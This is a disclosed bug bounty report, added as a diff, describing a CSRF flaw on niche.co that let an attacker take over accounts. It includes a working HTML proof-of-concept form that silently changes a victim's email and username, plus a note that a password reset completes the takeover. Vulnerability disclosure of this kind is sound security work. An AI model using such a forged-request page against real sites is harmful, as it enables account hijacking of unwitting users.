@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/100849
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/hussein98d
+ReportedTo:Twitter(twitter)
+BountyAmount:560.0
+Severity:
+State:Closed
+DateOfDisclosure:21.12.2015 22:16:28
+
+Summary:
+
+Hello !
+This is an urgent report that you should immediately take care of !!
+
+I found out an account take over vulnerability on your acquisition : niche.co
+
+# Proof of concept code
+    <html>
+    <head>
+    <title>CSRF Attack Page: /get-started/complete</title>
+    </head>
+	
+    <body>
+	
+    <!-- attack -->
+
+    <form method="POST" action="https://www.niche.co/get-started/complete">
+    <input type="hidden" name="utf8" value="âœ“"/>
+    <input type="hidden" name="_method" value="patch"/>
+    <input type="hidden" name="authenticity_token" value=""/>
+    <input type="hidden" name="commit" value="Get Started"/>
+    <input type="hidden" name="user[name]" value="Hacked"/>
+    <input type="hidden" name="user[email]" value="hacker1@gmail.com"/>
+    <input type="hidden" name="user[username]" value="hacked123"/>
+    <input type="hidden" name="user[phone_number]" value=""/>
+    <input type="hidden" name="user[location_id]" value="79790"/>
+    <input type="hidden" name="user[gender]" value=""/>
+    <input type="submit" value="submit">s
+    </form>
+
+    <!-- /attack -->
+	
+    </body>
+    <html>
+
+
+The `authenticity_token` parameter is not properly validated by the end of the server when a user submits the form . 
+A hacker can , after changing the email of his victim , reset the password and login without any problem !
+
+Here is a video that I made : https://youtu.be/L7fMJkm7sp8 (unlisted video)
+
+
+Best Regards
+Hussein
